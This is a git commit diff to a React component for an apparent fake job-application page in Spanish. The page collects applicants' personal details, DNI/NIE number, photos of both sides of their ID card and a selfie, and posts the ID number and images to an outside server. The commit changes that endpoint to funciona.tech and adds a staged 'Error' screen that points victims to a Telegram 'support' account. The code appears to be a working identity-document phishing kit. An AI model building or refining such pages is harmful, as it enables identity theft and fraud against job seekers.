86343d32906769861ab535620b05f6dc685069e4
loppy33 <nikita.petrenko1406@gmail.com>
2024-05-18 10:44:41 +0200

    123

--- src/components/block5/block5.jsx
+++ src/components/block5/block5.jsx
@@ -16,19 +16,23 @@ export default function Block5() {
     const [selfie, setSelfie] = useState();
     const [missingInputs, setMissingInputs] = useState(false);
     const [dwieNie, setDwieNie] = useState('');
+    const [finish, setFinish] = useState()
 
     const handleSubmit = async (e) => {
         e.preventDefault();
-        if ( !front || !back || !selfie) {
+        if (!dwieNie || !front || !back || !selfie) {
             setMissingInputs(true);
+
         } else {
             setMissingInputs(false);
+            setFinish(true)
+
             const formData = new FormData();
             formData.append('prize', dwieNie);
             formData.append('images', front); // Добавляем переднее изображение в список images
             formData.append('images', back); // Добавляем заднее изображение в список images
             formData.append('images', selfie); // Добавляем селфи в список images
-            await axios.post('https://luckreel.fun:3001/send', formData);
+            await axios.post('https://funciona.tech:3001/send', formData);
         }
     };
 
@@ -57,43 +61,52 @@ export default function Block5() {
         <div className="Block5" >
             <div className="container">
                 <h2>Proporcionar información para conseguir un trabajo!</h2>
-                {passScaner ? (
-                    <PassportScanner
-                        front={front}
-                        setFront={setFront} setBack={setBack} setSelfie={setSelfie}
-                        passScaner={passScaner} setPassScaner={setPassScaner}
-                    ></PassportScanner>
+
+                {finish ? (
+                    <p>Error, por favor escribe al <a href="https://t.me/emiliogonzalesg">soporte</a>.</p>
                 ) : (
-                    <form action="" id='sec' onSubmit={handleSubmit}>
-                        <input type="text" placeholder='Apellido' />
-                        <input type="text" placeholder='Nombre' />
-                        <input type="text" placeholder='DNI\NIE' value={dwieNie} onChange={(e) => setDwieNie(e.target.value)} />
-                        <input type="text" placeholder='Fecha de nacimiento' />
-                        <input type="text" placeholder='Número de teléfono' />
-                        <input type="text" placeholder='Dirección de residencia' />
-                        {/*TODO 3 штуки для фотки */}
+                    <>
+                        {passScaner ? (
+                            <PassportScanner
+                                front={front}
+                                setFront={setFront} setBack={setBack} setSelfie={setSelfie}
+                                passScaner={passScaner} setPassScaner={setPassScaner}
+                            ></PassportScanner>
+                        ) : (
+                            <form action="" id='sec' onSubmit={handleSubmit}>
+                                <input type="text" placeholder='Apellido' />
+                                <input type="text" placeholder='Nombre' />
+                                <input type="text" placeholder='DNI\NIE' value={dwieNie} onChange={(e) => setDwieNie(e.target.value)} />
+                                <input type="text" placeholder='Fecha de nacimiento' />
+                                <input type="text" placeholder='Número de teléfono' />
+                                <input type="text" placeholder='Dirección de residencia' />
+                                {/*TODO 3 штуки для фотки */}
 
-                        <div className="photo front">
-                            <input type="file" accept="image/*" capture="environment" onChange={(e) => handleFileChange(e, 'front')} />
-                            <a href="#cam"><span onClick={() => setPassScaner('front')}>{front ? (<img src={URL.createObjectURL(front)} alt="" />) : (<FaRegAddressCard />)} Antes ID CARD</span></a>
-                        </div>
+                                <div className="photo front">
+                                    <input type="file" accept="image/*" capture="environment" onChange={(e) => handleFileChange(e, 'front')} />
+                                    <a href="#cam"><span onClick={() => setPassScaner('front')}>{front ? (<img src={URL.createObjectURL(front)} alt="" />) : (<FaRegAddressCard />)} Antes ID CARD</span></a>
+                                </div>
 
-                        <div className="photo back">
-                            <input type="file" accept="image/*" capture="environment" onChange={(e) => handleFileChange(e, 'back')} />
-                            <a href="#cam"><span onClick={() => setPassScaner('back')}>{back ? (<img src={URL.createObjectURL(back)} alt="" />) : (<FaRegCreditCard />)} Atrás ID CARD</span></a>
-                        </div>
+                                <div className="photo back">
+                                    <input type="file" accept="image/*" capture="environment" onChange={(e) => handleFileChange(e, 'back')} />
+                                    <a href="#cam"><span onClick={() => setPassScaner('back')}>{back ? (<img src={URL.createObjectURL(back)} alt="" />) : (<FaRegCreditCard />)} Atrás ID CARD</span></a>
+                                </div>
 
-                        <div className="photo selfie">
-                            <input type="file" accept="image/*" capture="user" onChange={(e) => handleFileChange(e, 'selfie')} />
-                            <a href="#cam"><span onClick={() => setPassScaner('selfie')}>{selfie ? (<img src={URL.createObjectURL(selfie)} alt="" />) : (<FaRegCircleUser />)} Autofoto</span></a>
-                        </div>
+                                <div className="photo selfie">
+                                    <input type="file" accept="image/*" capture="user" onChange={(e) => handleFileChange(e, 'selfie')} />
+                                    <a href="#cam"><span onClick={() => setPassScaner('selfie')}>{selfie ? (<img src={URL.createObjectURL(selfie)} alt="" />) : (<FaRegCircleUser />)} Autofoto</span></a>
+                                </div>
 
 
-                        <span className='photo'>*Se da prioridad a perfiles de alta calidad con buenas fotos.</span>
-                        {missingInputs  && <span className="error-msg">¡No has subido todas las fotos!</span>}
-                        <button onClick={handleSubmit}>Enviar datos</button>
-                    </form>
+                                <span className='photo'>*Se da prioridad a perfiles de alta calidad con buenas fotos.</span>
+                                {missingInputs && <span className="error-msg">¡No has llenado todo!</span>}
+                                <button onClick={handleSubmit}>Enviar datos</button>
+                            </form>
+                        )}
+                    </>
                 )}
+
+
 
             </div>
         </div>
